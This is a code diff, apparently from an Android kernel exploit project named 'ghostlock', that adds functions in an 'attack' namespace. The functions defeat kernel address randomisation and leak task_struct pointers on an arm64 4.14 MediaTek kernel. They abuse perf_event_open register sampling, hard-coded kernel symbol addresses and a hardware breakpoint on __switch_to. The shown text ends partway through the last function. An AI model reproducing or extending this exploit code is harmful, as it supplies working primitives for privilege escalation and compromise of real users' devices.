@@ -21,6 +21,8 @@
 #include <sys/utsname.h>
 
 namespace ghostlock::attack {
+
+    uint64_t recover_image_base_self(void);
     void log_execution_settings(const profile::kernel_offsets *profile) {
         if (!profile) return;
         const profile::execution_settings *e = &profile->execution;
@@ -96,6 +98,13 @@ namespace ghostlock::attack {
         /* PROFILE-SUGGEST-01: execution tuning arrives fully merged from Kotlin;
          * the native side only consumes the resolved values. */
         session::g_exploit_session.profile = profile::TargetProfile::from(&decoded);
+        /* KASLR slide recovery is a sampling race: a quiet CPU can produce a
+         * histogram with no __schedule hit, which used to fall back to the
+         * link-time base and quietly poison every later address.  Retry a few
+         * times instead of accepting the fallback. */
+        for (int32_t attempt = 0; attempt < 6; attempt++) {
+            if (recover_image_base_self()) break;
+        }
         pr_success("resolved profile loaded: %s\n",
                    session::g_exploit_session.profile.release());
         if (config::runtime_config_snapshot().apply_profile(&session::g_exploit_session.profile) != 0)
@@ -549,7 +558,889 @@ namespace ghostlock::attack {
     }
 
     /* Find a task through perf sample records. */
+
+    /* Callee-saved sampling of a sleeping thread.
+     *
+     * The vote over all 32 registers only works on kernels whose tag scheme
+     * leaves one register holding `current` at every sample point. This 4.14
+     * MTK kernel keeps `current` in sp_el0, which perf does not export, so the
+     * all-register vote returns a constant that is not a task at all (seen:
+     * 0xffffff80ffffffd0 with ~17% of the samples).
+     *
+     * In kernel mode the task pointer is nevertheless live in the callee-saved
+     * set across every schedule(): a thread parked in nanosleep is sampled
+     * inside the timer/scheduler paths, where x19..x28 hold it. Sampling only
+     * x19..x28 of a *sleeping* thread therefore observes one value repeatedly
+     * instead of 32 registers of noise.
+     */
+    /* Recovered once per boot from the kernel text anchor (see below). */
+    static uint64_t g_kernel_slide = 0;
+
+    uintptr_t perf_find_task_sleeping(void) {
+        int32_t pipefd[2];
+        if (pipe(pipefd) != 0) return 0;
+        const pid_t child = fork();
+        if (child < 0) {
+            close(pipefd[0]);
+            close(pipefd[1]);
+            return 0;
+        }
+        if (child == 0) {
+            close(pipefd[0]);
+            const pid_t tid = static_cast<pid_t>(syscall(__NR_gettid));
+            ssize_t ignored = write(pipefd[1], &tid, sizeof(tid));
+            (void) ignored;
+            close(pipefd[1]);
+            /* Block in pipe_read(): read() -> pipe_read() -> schedule(), and
+             * pipe_read keeps `current`-derived state in callee-saved
+             * registers across the block. */
+            char byte = 0;
+            for (;;) (void) read(pipefd[0], &byte, 0);
+        }
+        close(pipefd[1]);
+        pid_t tid = 0;
+        if (read(pipefd[0], &tid, sizeof(tid)) != static_cast<ssize_t>(sizeof(tid)) || tid <= 0) {
+            close(pipefd[0]);
+            kill(child, SIGKILL);
+            return 0;
+        }
+        close(pipefd[0]);
+
+        struct perf_event_attr pe{};
+        pe.type = PERF_TYPE_SOFTWARE;
+        pe.size = sizeof(pe);
+        pe.config = PERF_COUNT_SW_CPU_CLOCK;
+        pe.sample_period = 2000;
+        pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
+        /* PERF_REG_ARM64_X19 .. X28 */
+        /* Every register, but only samples taken inside __schedule() /
+         * finish_task_switch(): there prev/next (task_struct *) are live in
+         * x19..x28 for the whole function, so the PC filter removes the
+         * stack-pointer and garbage dominated samples. Addresses come from the
+         * shipped image (see .g14/derive/honor.syms). */
+        pe.sample_regs_intr = (1ULL << 32) - 1;
+        pe.disabled = 1;
+        pe.exclude_user = 1;
+        pe.exclude_hv = 1;
+        pe.exclude_idle = 1;
+
+        errno = 0;
+        support::UniqueFd fd(static_cast<int32_t>(
+            syscall(__NR_perf_event_open, &pe, tid, -1, -1, 0)));
+        if (!fd.valid()) {
+            pr_warning("sleeping perf_event_open failed errno=%d\n", errno);
+            kill(child, SIGKILL);
+            return 0;
+        }
+        constexpr size_t kPerfPageSize = 4096;
+        constexpr size_t kPerfDataPages = 64;
+        constexpr size_t kPerfDataSize = kPerfPageSize * kPerfDataPages;
+        const size_t msz = kPerfPageSize + kPerfDataSize;
+        void *mapped = mmap(nullptr, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
+        if (mapped == MAP_FAILED) {
+            kill(child, SIGKILL);
+            return 0;
+        }
+        support::MappedRegion buf(mapped, msz);
+        ioctl(fd.get(), PERF_EVENT_IOC_ENABLE, 0);
+        struct timespec nap = {.tv_sec = 0, .tv_nsec = 250000000};
+        syscall(__NR_nanosleep, &nap, nullptr);
+        ioctl(fd.get(), PERF_EVENT_IOC_DISABLE, 0);
+        kill(child, SIGKILL);
+        waitpid(child, nullptr, 0);
+
+        auto *hdr = static_cast<struct perf_event_mmap_page *>(buf.data());
+        const uint64_t head = hdr->data_head;
+        std::atomic_thread_fence(std::memory_order_acquire);
+        char *base = reinterpret_cast<char *>(buf.data()) + kPerfPageSize;
+        uint64_t pos = hdr->data_tail;
+        constexpr int32_t kRegs = 32;
+        static const char *const kRegName[kRegs] = {
+            "x00", "x01", "x02", "x03", "x04", "x05", "x06", "x07",
+            "x08", "x09", "x10", "x11", "x12", "x13", "x14", "x15",
+            "x16", "x17", "x18", "x19", "x20", "x21", "x22", "x23",
+            "x24", "x25", "x26", "x27", "x28", "x29", "x30", "sp "};
+        /* __task_pid_nr_ns(struct task_struct *tsk, ...) — first argument is
+         * `current`, so x0 at any PC inside it is exactly the pointer we want. */
+        std::array<std::array<uintptr_t, 3>, kRegs> topv{};
+        std::array<std::array<int32_t, 3>, kRegs> topc{};
+        int64_t samples = 0;
+        int32_t dump = 0;
+        int64_t ip_total = 0;
+        constexpr int32_t kNip = 32;
+        uint64_t ipv[kNip] = {};
+        int32_t ipc[kNip] = {};
+
+        /* Slide recovery.  The image is mapped at a random virtual base, so the
+         * sampled IPs are far away from their link-time addresses.  Two
+         * byte-exact instruction sequences in the image give a fixed anchor:
+         *   _raw_write_lock+0x18      (the wfe/ldaxr spin of the ticket lock)
+         *   _raw_write_lock_irq+0x1c  (0x78 further on, same shape)
+         * Either one can be the hot spot, so both candidate slides are tried
+         * and the one that puts the samples inside __schedule() wins. */
+        constexpr uint64_t kSpinWfeVa = 0xffffff8009a898b0ULL;
+        constexpr uint64_t kSpinWfeIrqVa = 0xffffff8009a89928ULL;
+        const uint64_t kSchedBody = 0xffffff8009a828f0ULL + (target::address::kImageTextBaseRuntime - 0xffffff8008080000ULL);
+        constexpr uint64_t kSchedBodyLen = 0x1800ULL;
+        uint64_t sched_lo = 0;
+        uint64_t sched_hi = 0;
+        {
+            uint64_t pass1[kNip] = {};
+            int32_t pass1c[kNip] = {};
+            uint64_t scan = pos;
+            while (scan < head) {
+                auto *ev = reinterpret_cast<struct perf_event_header *>(
+                    base + (scan % kPerfDataSize));
+                if (ev->size == 0) break;
+                if (ev->type == PERF_RECORD_SAMPLE) {
+                    const uint64_t ip = *reinterpret_cast<uint64_t *>(
+                        reinterpret_cast<char *>(ev) + sizeof(*ev));
+                    for (int32_t k = 0; k < kNip; k++) {
+                        if (pass1c[k] && pass1[k] == ip) { pass1c[k]++; break; }
+                        if (!pass1c[k]) { pass1[k] = ip; pass1c[k] = 1; break; }
+                    }
+                }
+                scan += ev->size;
+            }
+            int32_t hot = 0;
+            for (int32_t k = 1; k < kNip; k++) if (pass1c[k] > pass1c[hot]) hot = k;
+            const uint64_t hot_ip = pass1c[hot] ? pass1[kNip > 0 ? hot : 0] : 0;
+            const uint64_t cand[2] = {
+                hot_ip > kSpinWfeVa ? hot_ip - kSpinWfeVa : 0,
+                hot_ip > kSpinWfeIrqVa ? hot_ip - kSpinWfeIrqVa : 0,
+            };
+            int32_t best_hits = -1;
+            for (int32_t c = 0; c < 2; c++) {
+                if (!cand[c]) continue;
+                const uint64_t lo = kSchedBody + cand[c];
+                int32_t hits = 0;
+                for (int32_t k = 0; k < kNip; k++) {
+                    if (!pass1c[k]) continue;
+                    if (pass1[k] >= lo && pass1[k] < lo + kSchedBodyLen) hits++;
+                }
+                if (hits > best_hits) {
+                    best_hits = hits;
+                    sched_lo = lo;
+                    sched_hi = lo + kSchedBodyLen;
+                }
+            }
+            pr_info("[dbg] hot ip=%016zx x%d slide-candidates=%016zx/%016zx sched-hits=%d\n",
+                    (size_t) hot_ip, pass1c[hot], (size_t) cand[0], (size_t) cand[1],
+                    best_hits);
+        }
+        while (pos < head) {
+            auto *ev = reinterpret_cast<struct perf_event_header *>(base + (pos % kPerfDataSize));
+            if (ev->size == 0) break;
+            if (ev->type == PERF_RECORD_SAMPLE) {
+                char *p = reinterpret_cast<char *>(ev) + sizeof(*ev);
+                if (dump < 2) {
+                    dump++;
+                    char hex[3 * 64 + 1];
+                    int32_t hn = 0;
+                    for (int32_t b = 0; b < 48; b++) {
+                        const unsigned char c = static_cast<unsigned char>(p[b]);
+                        hex[hn++] = "0123456789abcdef"[c >> 4];
+                        hex[hn++] = "0123456789abcdef"[c & 0xf];
+                        hex[hn++] = ' ';
+                    }
+                    hex[hn] = 0;
+                    pr_info("[dbg] raw ev->size=%u %s\n", (unsigned)ev->size, hex);
+                }
+                const uint64_t ip = *reinterpret_cast<uint64_t *>(p);
+                p += 8; /* IP */
+                const uint64_t abi = *reinterpret_cast<uint64_t *>(p);
+                p += 8;
+                {
+                    ip_total++;
+                    int32_t hit = -1;
+                    for (int32_t k = 0; k < kNip; k++) if (ipc[k] && ipv[k] == ip) { hit = k; break; }
+                    if (hit >= 0) ipc[hit]++;
+                    else for (int32_t k = 0; k < kNip; k++) if (!ipc[k]) { ipv[k] = ip; ipc[k] = 1; break; }
+                }
+                if (!getenv("GHOSTLOCK_PERF_ALL") && (!sched_lo || ip < sched_lo || ip >= sched_hi)) {
+                    pos += ev->size;
+                    continue;
+                }
+                if (abi == 1 || abi == 2) {
+                    const uint64_t *regs = reinterpret_cast<const uint64_t *>(p);
+                    samples++;
+                    for (int32_t i = 0; i < kRegs; i++) {
+                        const uint64_t v = (regs[i] & 0x0000ffffffffffffULL) | 0xffff000000000000ULL;
+                        if ((v & 7ULL) != 0 || !in_direct_map(v)) continue;
+                        auto &vs = topv[static_cast<size_t>(i)];
+                        auto &cs = topc[static_cast<size_t>(i)];
+                        int32_t slot = -1;
+                        for (int32_t k = 0; k < 3; k++) if (cs[k] && vs[k] == v) slot = k;
+                        if (slot < 0) {
+                            slot = 0;
+                            for (int32_t k = 1; k < 3; k++) if (cs[k] < cs[slot]) slot = k;
+                            if (cs[slot] == 0 || true) { vs[slot] = v; cs[slot] = 0; }
+                        }
+                        cs[slot]++;
+                    }
+                }
+            }
+            pos += ev->size;
+        }
+        hdr->data_tail = head;
+        pr_info("[dbg] sleeping samples=%lld ips=%lld\n",
+                static_cast<long long>(samples), static_cast<long long>(ip_total));
+        for (int32_t k = 0; k < kNip; k++)
+            if (ipc[k]) pr_info("[dbg] ip %016zx x%d\n", (size_t)ipv[k], ipc[k]);
+        uintptr_t best = 0;
+        int32_t bestc = 0;
+        for (int32_t i = 0; i < kRegs; i++)
+            for (int32_t k = 0; k < 3; k++)
+                if (topc[static_cast<size_t>(i)][static_cast<size_t>(k)])
+                    pr_info("[dbg] %s #%d %016zx x%d\n", kRegName[i], k,
+                            (size_t)topv[static_cast<size_t>(i)][static_cast<size_t>(k)],
+                            topc[static_cast<size_t>(i)][static_cast<size_t>(k)]);
+        if (topc[0][0] > bestc) { bestc = topc[0][0]; best = topv[0][0]; }
+        if (sched_lo) g_kernel_slide = sched_lo - kSchedBody;
+        return bestc >= 3 ? best : 0;
+    }
+
+    /* Phase 2: the child spins in getpid(), so the hot sample lands in
+     * __task_pid_nr_ns(), whose first argument is `current`.  Requires the
+     * slide recovered by phase 1. */
+    uintptr_t perf_task_from_pid_ns(void) {
+        constexpr uint64_t kSpinWfeVa = 0xffffff8009a898b0ULL;
+        constexpr uint64_t kSpinWfeIrqVa = 0xffffff8009a89928ULL;
+        const uint64_t kSwitchLink = 0xffffff80082862e8ULL + (target::address::kImageTextBaseRuntime - 0xffffff8008080000ULL);
+        constexpr uint64_t kSwitchLen = 0x200ULL;
+
+        int32_t pipefd[2];
+        if (pipe(pipefd) != 0) return 0;
+        const pid_t child = fork();
+        if (child < 0) { close(pipefd[0]); close(pipefd[1]); return 0; }
+        if (child == 0) {
+            close(pipefd[0]);
+            const pid_t tid = static_cast<pid_t>(syscall(__NR_gettid));
+            ssize_t ignored = write(pipefd[1], &tid, sizeof(tid));
+            (void) ignored;
+            close(pipefd[1]);
+            /* getpid() is the point: its `mrs x0, sp_el0; bl __task_pid_nr_ns`
+             * leaves current in x0 at every sample inside the callee.  Yield
+             * every so often so a tight loop cannot starve this process. */
+            for (uint32_t i = 0;; i++) {
+                syscall(__NR_getpid);
+                if ((i & 0x3ff) == 0) syscall(__NR_sched_yield);
+            }
+        }
+        close(pipefd[1]);
+        pid_t tid = 0;
+        if (read(pipefd[0], &tid, sizeof(tid)) != static_cast<ssize_t>(sizeof(tid)) || tid <= 0) {
+            close(pipefd[0]); kill(child, SIGKILL); return 0;
+        }
+        close(pipefd[0]);
+
+        struct perf_event_attr pe{};
+        pe.type = PERF_TYPE_SOFTWARE;
+        pe.size = sizeof(pe);
+        pe.config = PERF_COUNT_SW_CPU_CLOCK;
+        pe.sample_period = 2000;
+        pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
+        pe.sample_regs_intr = (1ULL << 32) - 1;
+        pe.disabled = 1;
+        pe.exclude_user = 1;
+        pe.exclude_hv = 1;
+        pe.exclude_idle = 1;
+        errno = 0;
+        support::UniqueFd fd(static_cast<int32_t>(
+            syscall(__NR_perf_event_open, &pe, tid, -1, -1, 0)));
+        if (!fd.valid()) { kill(child, SIGKILL); return 0; }
+        constexpr size_t kPage = 4096;
+        constexpr size_t kSize = kPage * 64;
+        void *mapped = mmap(nullptr, kPage + kSize, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
+        if (mapped == MAP_FAILED) { kill(child, SIGKILL); return 0; }
+        support::MappedRegion buf(mapped, kPage + kSize);
+        ioctl(fd.get(), PERF_EVENT_IOC_ENABLE, 0);
+        struct timespec nap = {.tv_sec = 0, .tv_nsec = 400000000};
+        syscall(__NR_nanosleep, &nap, nullptr);
+        ioctl(fd.get(), PERF_EVENT_IOC_DISABLE, 0);
+        kill(child, SIGKILL);
+        waitpid(child, nullptr, 0);
+
+        auto *hdr = static_cast<struct perf_event_mmap_page *>(buf.data());
+        const uint64_t head = hdr->data_head;
+        std::atomic_thread_fence(std::memory_order_acquire);
+        char *base = reinterpret_cast<char *>(buf.data()) + kPage;
+        const uint64_t pos = hdr->data_tail;
+
+        /* pass 1: where do the samples land?  The dominant one is the ticket
+         * lock spin; its two known link addresses give the slide. */
+        uint64_t hot_ip = 0;
+        int32_t hot_n = 0;
+        {
+            uint64_t ips[16] = {};
+            int32_t cnts[16] = {};
+            uint64_t scan = pos;
+            while (scan < head) {
+                auto *ev = reinterpret_cast<struct perf_event_header *>(base + (scan % kSize));
+                if (ev->size == 0) break;
+                if (ev->type == PERF_RECORD_SAMPLE) {
+                    const uint64_t ip = *reinterpret_cast<uint64_t *>(
+                        reinterpret_cast<char *>(ev) + sizeof(*ev));
+                    for (int32_t k = 0; k < 16; k++) {
+                        if (cnts[k] && ips[k] == ip) { cnts[k]++; break; }
+                        if (!cnts[k]) { ips[k] = ip; cnts[k] = 1; break; }
+                    }
+                }
+                scan += ev->size;
+            }
+            for (int32_t k = 0; k < 16; k++) if (cnts[k] > hot_n) { hot_n = cnts[k]; hot_ip = ips[k]; }
+        }
+        const uint64_t cand[2] = {
+            hot_ip > kSpinWfeVa ? hot_ip - kSpinWfeVa : 0,
+            hot_ip > kSpinWfeIrqVa ? hot_ip - kSpinWfeIrqVa : 0,
+        };
+        pr_info("[dbg] switch hot=%016zx x%d cand=%016zx/%016zx\n",
+                (size_t) hot_ip, hot_n, (size_t) cand[0], (size_t) cand[1]);
+
+        for (int32_t c = 0; c < 2; c++) {
+            if (!cand[c]) continue;
+            const uint64_t lo = kSwitchLink + cand[c];
+            const uint64_t hi = lo + kSwitchLen;
+            uintptr_t top[4] = {};
+            int32_t topc[4] = {};
+            int64_t in_range = 0;
+            uint64_t scan = pos;
+            while (scan < head) {
+                auto *ev = reinterpret_cast<struct perf_event_header *>(base + (scan % kSize));
+                if (ev->size == 0) break;
+                if (ev->type == PERF_RECORD_SAMPLE) {
+                    char *q = reinterpret_cast<char *>(ev) + sizeof(*ev);
+                    const uint64_t ip = *reinterpret_cast<uint64_t *>(q);
+                    q += 8;
+                    const uint64_t abi = *reinterpret_cast<uint64_t *>(q);
+                    q += 8;
+                    if (ip >= lo && ip < hi && (abi == 1 || abi == 2)) {
+                        const uint64_t *regs = reinterpret_cast<const uint64_t *>(q);
+                        const uint64_t v = (regs[0] & 0x0000ffffffffffffULL) | 0xffff000000000000ULL;
+                        if ((v & 0xfULL) == 0 && in_direct_map(v)) {
+                            in_range++;
+                            int32_t slot = -1;
+                            for (int32_t k = 0; k < 4; k++) if (topc[k] && top[k] == v) slot = k;
+                            if (slot < 0) {
+                                slot = 0;
+                                for (int32_t k = 1; k < 4; k++) if (topc[k] < topc[slot]) slot = k;
+                                top[slot] = v; topc[slot] = 0;
+                            }
+                            topc[slot]++;
+                        }
+                    }
+                }
+                scan += ev->size;
+            }
+            pr_info("[dbg] switch cand%d samples=%lld\n", c, static_cast<long long>(in_range));
+            for (int32_t k = 0; k < 4; k++)
+                if (topc[k]) pr_info("[dbg] switch cand%d x0 %016zx x%d\n", c, (size_t) top[k], topc[k]);
+            int32_t best = 0;
+            for (int32_t k = 1; k < 4; k++) if (topc[k] > topc[best]) best = k;
+            if (topc[best] >= 3 && in_range > 0) {
+                g_kernel_slide = cand[c];
+                return top[best];
+            }
+        }
+        hdr->data_tail = head;
+        return 0;
+    }
+
+    /* Recover the KASLR slide for this boot by sampling our own thread while it
+     * spins in a syscall: the dominant PC is the ticket-lock wfe spin, whose
+     * link address is a known constant, so slide = hot_ip - anchor.  A second
+     * candidate anchor (the _irq variant, 0x78 further on) is disambiguated by
+     * checking which one puts the remaining samples inside __schedule(). */
+    uint64_t recover_image_base_self(void) {
+        constexpr uint64_t kSpinWfeVa = 0xffffff8009a898b0ULL;
+        constexpr uint64_t kSpinWfeIrqVa = 0xffffff8009a89928ULL;
+        constexpr uint64_t kTextLo = 0xffffff8008081000ULL;
+        constexpr uint64_t kTextHi = 0xffffff800b400000ULL;
+        const uint64_t kSchedBody = 0xffffff8009a828f0ULL + (target::address::kImageTextBaseRuntime - 0xffffff8008080000ULL);
+        constexpr uint64_t kSchedLen = 0x1800ULL;
+
+        struct perf_event_attr pe{};
+        pe.type = PERF_TYPE_SOFTWARE;
+        pe.size = sizeof(pe);
+        pe.config = PERF_COUNT_SW_CPU_CLOCK;
+        pe.sample_period = 2000;
+        pe.sample_type = PERF_SAMPLE_IP;
+        pe.disabled = 1;
+        pe.exclude_user = 1;
+        pe.exclude_hv = 1;
+        errno = 0;
+        support::UniqueFd fd(static_cast<int32_t>(
+            syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0)));
+        if (!fd.valid()) {
+            pr_warning("slide: perf_event_open(self) failed errno=%d\n", errno);
+            return 0;
+        }
+        constexpr size_t kPage = 4096;
+        constexpr size_t kSize = kPage * 64;
+        void *mapped = mmap(nullptr, kPage + kSize, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
+        if (mapped == MAP_FAILED) return 0;
+        support::MappedRegion buf(mapped, kPage + kSize);
+        ioctl(fd.get(), PERF_EVENT_IOC_ENABLE, 0);
+        const uint64_t deadline_ns = 200000000ULL;
+        struct timespec t0{};
+        syscall(__NR_clock_gettime, CLOCK_MONOTONIC, &t0);
+        for (;;) {
+            syscall(__NR_sched_yield);
+            struct timespec now{};
+            syscall(__NR_clock_gettime, CLOCK_MONOTONIC, &now);
+            const uint64_t dt = (uint64_t)(now.tv_sec - t0.tv_sec) * 1000000000ULL +
+                                (uint64_t)(now.tv_nsec - t0.tv_nsec);
+            if (dt >= deadline_ns) break;
+        }
+        ioctl(fd.get(), PERF_EVENT_IOC_DISABLE, 0);
+
+        auto *hdr = static_cast<struct perf_event_mmap_page *>(buf.data());
+        const uint64_t head = hdr->data_head;
+        std::atomic_thread_fence(std::memory_order_acquire);
+        char *base = reinterpret_cast<char *>(buf.data()) + kPage;
+        uint64_t pos = hdr->data_tail;
+        constexpr int32_t kN = 24;
+        uint64_t ips[kN] = {};
+        int32_t cnt[kN] = {};
+        while (pos < head) {
+            auto *ev = reinterpret_cast<struct perf_event_header *>(base + (pos % kSize));
+            if (ev->size == 0) break;
+            if (ev->type == PERF_RECORD_SAMPLE) {
+                const uint64_t ip = *reinterpret_cast<uint64_t *>(
+                    reinterpret_cast<char *>(ev) + sizeof(*ev));
+                for (int32_t k = 0; k < kN; k++) {
+                    if (cnt[k] && ips[k] == ip) { cnt[k]++; break; }
+                    if (!cnt[k]) { ips[k] = ip; cnt[k] = 1; break; }
+                }
+            }
+            pos += ev->size;
+        }
+        hdr->data_tail = head;
+        int32_t hot = 0;
+        for (int32_t k = 1; k < kN; k++) if (cnt[k] > cnt[hot]) hot = k;
+        if (!cnt[hot]) return 0;
+        const uint64_t hot_ip = ips[hot];
+        for (int32_t k = 0; k < kN && k < 6; k++)
+            if (cnt[k])
+                pr_info("[dbg] self ip[%d]=%016llx x%d\n", k,
+                        (unsigned long long) ips[k], cnt[k]);
+        const uint64_t cand[2] = {hot_ip - kSpinWfeVa, hot_ip - kSpinWfeIrqVa};
+        int32_t best_hits = -1;
+        uint64_t chosen = 0;
+        for (int32_t c = 0; c < 2; c++) {
+            const uint64_t lo = kSchedBody + cand[c];
+            int32_t hits = 0;
+            for (int32_t k = 0; k < kN; k++)
+                if (cnt[k] && ips[k] >= lo && ips[k] < lo + kSchedLen) hits++;
+            if (hits > best_hits) { best_hits = hits; chosen = cand[c]; }
+        }
+        /* KASLR moves the image anywhere inside the 39-bit kernel VA window, so
+         * the only structural checks available here are the direct-map bounds
+         * and the requirement that the disambiguation found __schedule. */
+        const uint64_t runtime_base = kTextLo + chosen;
+        /* ARM64 head.S places _text at image_start + text_offset(0x80000) and
+         * kaslr aligns the image itself to 1 MiB, so a genuine text base always
+         * ends in 0x80000. This rejects anchor misses that still happen to hit
+         * __schedule by luck. */
+        const bool aligned = (runtime_base & 0xfffffULL) == 0x80000ULL;
+        /* VA_BITS=39: the kernel half spans 0xffffff8000000000.., and KASLR may
+         * place the image anywhere inside it (observed up to 0xffffff9d...). */
+        if (best_hits <= 0 || !aligned || runtime_base < 0xffffff8000000000ULL ||
+            runtime_base > 0xfffffffffffff000ULL) {
+            pr_warning("slide: implausible base %016llx hits=%d\n",
+                       (unsigned long long) runtime_base, best_hits);
+            return 0;
+        }
+        target::address::set_image_text_base(runtime_base);
+        pr_success("slide: hot=%016llx x%d base=%016llx slide=%016llx sched_hits=%d\n",
+                   (unsigned long long) hot_ip, cnt[hot],
+                   (unsigned long long) runtime_base, (unsigned long long) chosen, best_hits);
+        return runtime_base;
+    }
+
+
+    /* Probe __switch_to: it is the only kernel function that receives the task
+     * pointer explicitly (x0 = prev, x1 = next), so it does not depend on the
+     * sp_el0 trick that perf cannot sample on arm64 4.14. */
+    uintptr_t perf_task_switch_probe(void) {
+        const uint64_t slide = target::address::kImageTextBaseRuntime - 0xffffff8008080000ULL;
+        const uint64_t kSwitchTo = 0xffffff80082132b4ULL + slide;
+        constexpr uint64_t kSwitchToLen = 0x140ULL;
+        constexpr uint64_t kRegs = 6;
+
+        int32_t pipefd[2];
+        if (pipe(pipefd) != 0) return 0;
+        const pid_t child = fork();
+        if (child < 0) { close(pipefd[0]); close(pipefd[1]); return 0; }
+        if (child == 0) {
+            close(pipefd[0]);
+            const pid_t tid = static_cast<pid_t>(syscall(__NR_gettid));
+            ssize_t ignored = write(pipefd[1], &tid, sizeof(tid));
+            (void) ignored;
+            close(pipefd[1]);
+            for (;;) {
+                struct timespec ts = {.tv_sec = 0, .tv_nsec = 200000};
+                syscall(__NR_nanosleep, &ts, nullptr);
+            }
+        }
+        close(pipefd[1]);
+        pid_t tid = 0;
+        if (read(pipefd[0], &tid, sizeof(tid)) != static_cast<ssize_t>(sizeof(tid)) || tid <= 0) {
+            close(pipefd[0]); kill(child, SIGKILL); return 0;
+        }
+        close(pipefd[0]);
+
+        struct perf_event_attr pe{};
+        pe.type = PERF_TYPE_SOFTWARE;
+        pe.size = sizeof(pe);
+        pe.config = PERF_COUNT_SW_CPU_CLOCK;
+        pe.sample_period = 1000;
+        pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
+        pe.sample_regs_intr = (1ULL << kRegs) - 1;
+        pe.disabled = 1;
+        pe.exclude_user = 1;
+        pe.exclude_hv = 1;
+        pe.exclude_idle = 1;
+        support::UniqueFd fd(static_cast<int32_t>(
+            syscall(__NR_perf_event_open, &pe, tid, -1, -1, 0)));
+        if (!fd.valid()) { kill(child, SIGKILL); return 0; }
+        constexpr size_t kPage = 4096;
+        constexpr size_t kSize = kPage * 64;
+        void *mapped = mmap(nullptr, kPage + kSize, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
+        if (mapped == MAP_FAILED) { kill(child, SIGKILL); return 0; }
+        support::MappedRegion buf(mapped, kPage + kSize);
+        ioctl(fd.get(), PERF_EVENT_IOC_ENABLE, 0);
+        struct timespec nap = {.tv_sec = 0, .tv_nsec = 500000000};
+        syscall(__NR_nanosleep, &nap, nullptr);
+        ioctl(fd.get(), PERF_EVENT_IOC_DISABLE, 0);
+        kill(child, SIGKILL);
+        waitpid(child, nullptr, 0);
+
+        auto *hdr = static_cast<struct perf_event_mmap_page *>(buf.data());
+        const uint64_t head = hdr->data_head;
+        std::atomic_thread_fence(std::memory_order_acquire);
+        char *base = reinterpret_cast<char *>(buf.data()) + kPage;
+        const uint64_t pos = hdr->data_tail;
+        const uint64_t lo = kSwitchTo;
+        const uint64_t hi = kSwitchTo + kSwitchToLen;
+
+        uintptr_t top[4] = {};
+        int32_t topc[4] = {};
+        uint64_t hips[6] = {};
+        int32_t hcnt[6] = {};
+        int64_t in_range = 0;
+        int64_t total = 0;
+        uint64_t scan = pos;
+        while (scan < head) {
+            auto *ev = reinterpret_cast<struct perf_event_header *>(base + (scan % kSize));
+            if (ev->size == 0) break;
+            if (ev->type == PERF_RECORD_SAMPLE) {
+                char *q = reinterpret_cast<char *>(ev) + sizeof(*ev);
+                const uint64_t ip = *reinterpret_cast<uint64_t *>(q);
+                q += 8;
+                const uint64_t abi = *reinterpret_cast<uint64_t *>(q);
+                q += 8;
+                total++;
+                for (int32_t k = 0; k < 6; k++) {
+                    if (hcnt[k] && hips[k] == ip) { hcnt[k]++; break; }
+                    if (!hcnt[k]) { hips[k] = ip; hcnt[k] = 1; break; }
+                }
+                if (ip >= lo && ip < hi && (abi == 1 || abi == 2)) {
+                    in_range++;
+                    for (uint64_t r = 0; r < kRegs; r++) {
+                        const uint64_t v = *reinterpret_cast<uint64_t *>(q + r * 8);
+                        if (r != 0 && r != 1) continue;    /* x0 = prev, x1 = next */
+                        const uintptr_t cand = static_cast<uintptr_t>(
+                            (v & 0x0000ffffffffffffULL) | 0xffff000000000000ULL);
+                        if (!cand || (cand & 7) != 0 || (cand & 0xfff) == 0) continue;
+                        if (cand < 0xffffff8000000000ULL || cand >= 0xffffff9000000000ULL) continue;
+                        for (int32_t k = 0; k < 4; k++) {
+                            if (topc[k] && top[k] == cand) { topc[k]++; break; }
+                            if (!topc[k]) { top[k] = cand; topc[k] = 1; break; }
+                        }
+                    }
+                }
+            }
+            scan += ev->size;
+        }
+        pr_info("[dbg] switch samples=%ld in_range=%ld lo=%016llx hi=%016llx\n",
+                (long) total, (long) in_range, (unsigned long long) lo, (unsigned long long) hi);
+        for (int32_t k = 0; k < 6; k++) {
+            if (hcnt[k]) pr_info("[dbg]   ip %016llx x%d\n",
+                                 (unsigned long long) hips[k], hcnt[k]);
+        }
+        for (int32_t k = 0; k < 4; k++) {
+            if (topc[k] >= 5 && top[k]) return top[k];
+        }
+        return 0;
+    }
+
+
+    /* Hardware execute breakpoint on __switch_to: fires exactly at function
+     * entry, where x0 = prev and x1 = next, so no sp_el0 sampling is needed. */
+    uintptr_t perf_task_breakpoint_probe(void) {
+        constexpr uint32_t kPerfTypeBreakpoint = 5;
+        constexpr uint32_t kHwBreakpointX = 4;
+        constexpr uint64_t kHwLen8 = 8;
+
+        const uint64_t slide = target::address::kImageTextBaseRuntime - 0xffffff8008080000ULL;
+        const uint64_t switch_to = 0xffffff80082132b4ULL + slide;
+
+        int32_t pipefd[2];
+        if (pipe(pipefd) != 0) return 0;
+        const pid_t child = fork();
+        if (child < 0) { close(pipefd[0]); close(pipefd[1]); return 0; }
+        if (child == 0) {
+            close(pipefd[0]);
+            const pid_t tid = static_cast<pid_t>(syscall(__NR_gettid));
+            ssize_t ignored = write(pipefd[1], &tid, sizeof(tid));
+            (void) ignored;
+            close(pipefd[1]);
+            for (;;) {
+                struct timespec ts = {.tv_sec = 0, .tv_nsec = 300000};
+                syscall(__NR_nanosleep, &ts, nullptr);
+            }
+        }
+        close(pipefd[1]);
+        pid_t tid = 0;
+        if (read(pipefd[0], &tid, sizeof(tid)) != static_cast<ssize_t>(sizeof(tid)) || tid <= 0) {
+            close(pipefd[0]); kill(child, SIGKILL); return 0;
+        }
+        close(pipefd[0]);
+
+        struct perf_event_attr pe{};
+        pe.type = kPerfTypeBreakpoint;
+        pe.size = sizeof(pe);
+        pe.bp_type = kHwBreakpointX;
+        pe.bp_addr = switch_to;
+        {
+            const char *len_env = getenv("GHOSTLOCK_BP_LEN");
+            pe.bp_len = len_env ? static_cast<uint64_t>(strtoul(len_env, nullptr, 0)) : kHwLen8;
+        }
